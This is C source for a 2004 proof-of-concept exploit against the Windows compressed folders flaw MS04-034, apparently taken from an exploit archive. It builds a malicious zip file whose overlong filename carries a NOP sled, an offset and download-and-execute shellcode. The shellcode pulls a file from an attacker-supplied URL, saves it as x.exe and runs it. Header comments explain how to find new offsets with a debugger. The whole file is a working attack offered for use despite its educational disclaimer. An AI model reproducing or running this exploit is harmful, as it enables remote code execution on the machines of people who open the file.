/* Microsoft Windows Vulnerability in Compressed (zipped) Folders (MS04-034)
*
* Tested under Windows XP SP0 Spanish/English
*
* Original Advisory: http://www.eeye.com/html/research/advisories/AD20041012A.html
* Exploit Date: 21/10/2004
*
* Tarako - Haxorcitos.com 2004
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
* Greetings to: #haxorcitos, #dsr and #localhost @efnet
*
*
* How to get new offsets:
* 1) attach debugger (i.e ollydbg) to explorer.exe
* 2) open the zip file as a folder and add or move some files to it
* 3) search in the explorer.exe memory the shellcode and get the addresses
*
*/

#include <stdio.h>
#include <windows.h>

#pragma pack(1)

#define DATOS "Tarako-Haxorcitos.com"

typedef struct {
DWORD Signature; // PK.. 4 bytes (0x04034B50)
WORD VersionNeeded;
WORD GeneralPurposeFlag; // para el data descriptor y demas
WORD CompressionMethod;
WORD ModFileTime;
WORD ModFileDate;
DWORD Crc32;
DWORD CompressedSize;
DWORD UncompressedSize;
WORD FilenameLength;
WORD ExtraFieldLength;
// filename (variable size)
// extra field (variable size)
}TOPHEADER;


typedef struct { 
DWORD Signature; // PK.. 4 bytes (0x02014B50)
WORD MadeVersion;
WORD VersionNeeded;
WORD GeneralPurposeFlag; // para el data descriptor y demas
WORD CompressionMethod;
WORD ModFileTime;
WORD ModFileDate;
DWORD Crc32;
DWORD CompressedSize;
DWORD UncompressedSize;
WORD FilenameLength;
WORD ExtraFieldLength;
WORD FileCommentLength;
WORD DiskNumberStart;
WORD InternalFileAttributes;
DWORD ExternalFileAttributes;
DWORD RelativeOffsetOfLocalHeader;
// filename (variable size)
// extra field (variable size)
// file comment (variable size)
}MIDDLEHEADER;

typedef struct {
DWORD Signature; // PK.. 4 bytes (0x06054B50)
WORD NumOfThisDisk;
WORD NumDisckStartCentralDirectory;
WORD NumEntriesCentralDirOnThisDisk;
WORD TotalNumEntriesCentralDir;
DWORD SizeCentralDirectory;
DWORD OffsetCentraDirRespectStartDiskNum;
WORD ZipCommentLength;
// zipfile comment (variable size)
}BOTTOMHEADER;

/*
* download shellcode - RaiSe - raise@netsearch-ezine.com
*/
char shellcode1[] =
"\xEB\x5D\x5F\x8B\xF7\x80\x3F"
"\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x33\xC9\xB5\x05\x8B\xFE\x2B\xF9"
"\x8B\xEF\xB5\x03\x2B\xF9\x8B\xD7\xB2\x7C\x8B\xE2\x89\x75\xFC\xB5\x40\xC1\xE1\x08"
"\x89\x4D\xF8\x8D\x49\x3C\x8B\x09\x03\x4D\xF8\x8D\x49\x7F\x41\x8B\x09\x03\x4D\xF8"
"\x8B\xD9\x8B\x49\x0C\x03\x4D\xF8\x81\x39\x4B\x45\x52\x4E\x74\x07\x8D\x5B\x14\x8B"
"\xCB\xEB\xEB\x33\xC0\x53\xEB\x02\xEB\x7C\x8B\x33\x03\x75\xF8\x80\x7E\x03\x80\x74"
"\x14\x8B\x3E\x03\x7D\xF8\x47\x47\x56\x8B\x75\xFC\x33\xC9\xB1\x0D\xF3\xA6\x5E\x74"
"\x06\x40\x8D\x76\x04\xEB\xE0\x5B\x8B\x5B\x10\x03\x5D\xF8\xC1\xE0\x02\x03\xD8\x8B"
"\x03\x89\x45\xF4\x8B\x5D\xFC\x8D\x5B\x0D\x53\xFF\xD0\x89\x45\xF0\x8D\x5B\x09\x53"
"\x8B\x45\xF4\xFF\xD0\x89\x45\xEC\x8B\x45\xF0\x8B\x40\x3C\x03\x45\xF0\x8B\x40\x78"
"\x03\x45\xF0\x89\x45\xE8\x8B\x40\x20\x03\x45\xF0\x8D\x7B\x08\x33\xD2\x57\x8B\x30"
"\x03\x75\xF0\x33\xC9\xB1\x0F\xF3\xA6\x74\x0B\x5F\xEB\x02\xEB\x7A\x42\x8D\x40\x04"
"\xEB\xE7\x8B\x5D\xE8\x33\xC9\x53\x5F\x8B\x7F\x24\x03\x7D\xF0\xD1\xE2\x03\xFA\x66"
"\x8B\x0F\x8B\x5B\x1C\x03\x5D\xF0\xC1\xE1\x02\x03\xD9\x8B\x1B\x03\x5D\xF0\x89\x5D"
"\xE4\x8B\x55\xFC\x8D\x52\x2D\x8D\x7D\xE0\x33\xC9\xB1\x06\x51\x52\x52\x8B\x75\xF0"
"\x56\xFC\xFF\xD3\xFD\xAB\x5A\x59\x38\x2A\x74\x03\x42\xEB\xF9\x42\xE2\xE8\xB1\x04"
"\x51\x52\x52\x8B\x75\xEC\x56\xFC\xFF\xD3\xFD\xAB\x5A\x59\x38\x2A\x74\x03\x42\xEB"
"\xF9\x42\xE2\xE8\xFC\x52\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\xEB\x02\xEB\x7C"
"\x52\x8B\x45\xD8\xFF\xD0\x5B\x89\x45\xB8\x33\xD2\x52\x52\x52\x52\x53\x8B\x45\xC8"
"\xFF\xD0\x89\x45\xB4\x8D\x7B\x08\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52"
"\x52\x57\x50\x8B\x45\xC4\xFF\xD0\x89\x45\xB0\x8D\x55\xAC\x52\x33\xD2\xB6\x1F\xC1"
"\xE2\x08\x52\x8B\x4D\xB8\x51\x50\x8B\x45\xC0\xFF\xD0\x8B\x4D\xB0\x51\x8B\x45\xBC"
"\xFF\xD0\x8B\x4D\xB4\x51\x8B\x45\xBC\xFF\xD0\x33\xD2\x52\x43\x43\x53\x8B\x45\xE0"
"\xFF\xD0\x89\x45\xA8\x8B\x7D\xAC\x57\x8B\x55\xB8\x52\x50\x8B\x45\xDC\xFF\xD0\x8B"
"\x55\xA8\xEB\x02\xEB\x17\x52\x8B\x45\xD4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xD0\xFF"
"\xD0\x33\xD2\x52\x8B\x45\xCC\xFF\xD0\xE8\x0D\xFE\xFF\xFF\x4C\x6F\x61\x64\x4C\x69"
"\x62\x72\x61\x72\x79\x41\x08\x4B\x45\x52\x4E\x45\x4C\x33\x32\x08\x57\x49\x4E\x49"
"\x4E\x45\x54\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x5F"
"\x6C\x63\x72\x65\x61\x74\x08\x5F\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61"
"\x6C\x41\x6C\x6C\x6F\x63\x08\x5F\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78"
"\x65\x63\x08\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x08\x49\x6E\x74\x65\x72"
"\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65"
"\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65\x61\x64\x46\x69"
"\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65\x48\x61\x6E\x64"
"\x6C\x65\x08\x72\x08\x78\x2E\x65\x78\x65\x08";
char shellcode2[] ="\x08\x01";

char offset[]="\x41\x41\x41\x41";
char jmpbelow[]= "\xeb\x06\x90\x90";

int main(int argc,char *argv[]) {

FILE *ZipFile;
TOPHEADER *Cabecera1;
MIDDLEHEADER *Cabecera2;
BOTTOMHEADER *Cabecera3;

DWORD c;
UINT i;
char *filename;
char *url;

printf("\n MS04-034 - Vulnerability in Compressed (zipped) Folders POC");
printf("\n Tarako - Tarako[AT]Haxorcitos.com\n");

if (argc!=2) {
printf("\n\n Usage: %s <URL> \n",argv[0]);
exit(1);
}

url=argv[1];
printf("\n * URL: %s",url);


if (!(ZipFile=fopen("prueba.zip","w+b"))) {
printf("\n [E] fopen()");
exit(1);
}

c=0x8000; // filename length
filename=(char*)malloc(sizeof(char)*c); 
memset(filename,0,sizeof(filename));

for( i=0x0;i<c;i++) filename[i]=(BYTE)0x90;

memcpy(filename+0x1814,jmpbelow,strlen(jmpbelow));
memcpy(filename+0x1818,offset,strlen(offset));

memcpy(filename+0x7000,shellcode1,sizeof(shellcode1)-1);
memcpy(filename+0x7000+sizeof(shellcode1)-1,url,strlen(url));
memcpy(filename+0x7000+sizeof(shellcode1)+strlen(url)-1,shellcode2,sizeof(shellcode2)-1);

memcpy(filename+(c-4),".txt",4);

Cabecera1=(TOPHEADER*)malloc(sizeof(TOPHEADER));
Cabecera2=(MIDDLEHEADER*)malloc(sizeof(MIDDLEHEADER));
Cabecera3=(BOTTOMHEADER*)malloc(sizeof(BOTTOMHEADER));
memset(Cabecera1,0,sizeof(TOPHEADER));
memset(Cabecera2,0,sizeof(MIDDLEHEADER));
memset(Cabecera3,0,sizeof(BOTTOMHEADER)); 

///////////////////////////////////////////////////////////////////
// TOPHEADER
///////////////////////////////////////////////////////////////////
Cabecera1->Signature=0x04034B50; // DWORD
Cabecera1->VersionNeeded=0x000A; // WORD
Cabecera1->GeneralPurposeFlag=0x0002; // WORD para el data descriptor y demas
Cabecera1->CompressionMethod=0x0000; // WORD
Cabecera1->ModFileTime=0x1362; // WORD
Cabecera1->ModFileDate=0x3154; // WORD
Cabecera1->Crc32=0x85B36639; // DWORD
Cabecera1->CompressedSize=0x00000015; // DWORD
Cabecera1->UncompressedSize=0x00000015; // DWORD
Cabecera1->FilenameLength=(WORD)c; // WORD 0x0400;//strlen(filename);
Cabecera1->ExtraFieldLength=0x0000; // WORD
///////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////
// MIDDLEHEADER
///////////////////////////////////////////////////////////////////
Cabecera2->Signature=0x02014B50; // DWORD
Cabecera2->MadeVersion=0x0014; // WORD
Cabecera2->VersionNeeded=0x000A; // WORD
Cabecera2->GeneralPurposeFlag=0x0002; // WORD
Cabecera2->CompressionMethod=0x0000; // WORD
Cabecera2->ModFileTime=0x1362; // WORD
Cabecera2->ModFileDate=0x3154; // WORD
Cabecera2->Crc32=0x85B36639; // DWORD
Cabecera2->CompressedSize=0x00000015; // DWORD
Cabecera2->UncompressedSize=0x00000015; // DWORD
Cabecera2->FilenameLength=(WORD)c; // WORD 0x0400;//strlen(filename);
Cabecera2->ExtraFieldLength=0x0000; // WORD
Cabecera2->FileCommentLength=0x0000; // WORD
Cabecera2->DiskNumberStart=0x0000; // WORD
Cabecera2->InternalFileAttributes=0x0001; // WORD
Cabecera2->ExternalFileAttributes=0x00000020; // DWORD
Cabecera2->RelativeOffsetOfLocalHeader=0x00000000; // DWORD
///////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////
// BOTTOMHEADER
///////////////////////////////////////////////////////////////////
Cabecera3->Signature=0x06054B50; // DWORD
Cabecera3->NumOfThisDisk=0x0000; // WORD
Cabecera3->NumDisckStartCentralDirectory=0x0000; // WORD
Cabecera3->NumEntriesCentralDirOnThisDisk=0x0001; // WORD
Cabecera3->TotalNumEntriesCentralDir=0x0001; // WORD
Cabecera3->SizeCentralDirectory=sizeof(MIDDLEHEADER)+c; // DWORD
Cabecera3->OffsetCentraDirRespectStartDiskNum=sizeof(TOPHEADER)+strlen(DATOS)+c; // DWORD 
Cabecera3->ZipCommentLength=0x0000; // WORD
///////////////////////////////////////////////////////////////////

fwrite(Cabecera1, sizeof(TOPHEADER), 1,ZipFile);

fwrite(filename, c, 1,ZipFile); 
fwrite(DATOS,strlen(DATOS),1,ZipFile);

fwrite(Cabecera2, sizeof(MIDDLEHEADER), 1,ZipFile);
fwrite(filename, c, 1,ZipFile); 
fwrite(Cabecera3, sizeof(BOTTOMHEADER), 1,ZipFile);

fclose(ZipFile);
printf("\n * prueba.zip created\n");
return 1;
}

// milw0rm.com [2004-11-19]